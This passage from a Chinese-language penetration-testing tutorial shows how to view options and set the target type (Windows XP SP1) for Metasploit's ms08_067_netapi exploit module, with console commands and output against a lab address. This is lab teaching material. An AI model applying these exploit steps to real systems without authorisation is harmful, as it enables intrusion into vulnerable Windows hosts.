部分的渗透攻击模块可以用来攻击多种目标。为了加快渗透测试，可以根据自己的靶机来选择目标类型。当然，也可以不设置目标类型，Metasploit攻击模块将会自动探测靶机的类型。下面介绍选择目标类型的方法。


查看ms08_067_netapi模块的配置选项，在输出的结果中显示了Module options（模块选项）和Exploit target（可利用目标）两部分内容。具体如下：


msf5 exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

Name     Current Setting   Required    Description

-----    ---------------  ---------   -------------

RHOSTS 192.168.1.104  yes       The target address range or CIDR identifier

RPORT    445            yes       The SMB service port (TCP)

SMBPIPE  BROWSER       yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

Id  Name

--  ---------------------------

0   Automatic Targeting


从以上显示的信息中可以看到，在Exploit target部分包括Id（目标编号）和Name（目标名称）两列信息。此时，还没有设置目标类型，所以默认选择的目标编号为0，为自动探测目标。

从输出的信息中可以看到，共有72种目标类型可以选择。限于篇幅，部分内容省略了。此时，可以根据自己的目标系统类型来进行设置。


2）本例中的目标系统类型为Windows XP SP1，所以选择编号为2的目标类型。设置目标类型的语法如下：


set target [目标编号]


本例中将执行的命令如下：


msf5 exploit(ms08_067_netapi) > set target 2

target => 2


通过show options命令查看设置的目标类型。显示结果如下：


msf5 exploit(ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

…

2   Windows XP SP0/SP1 Universal
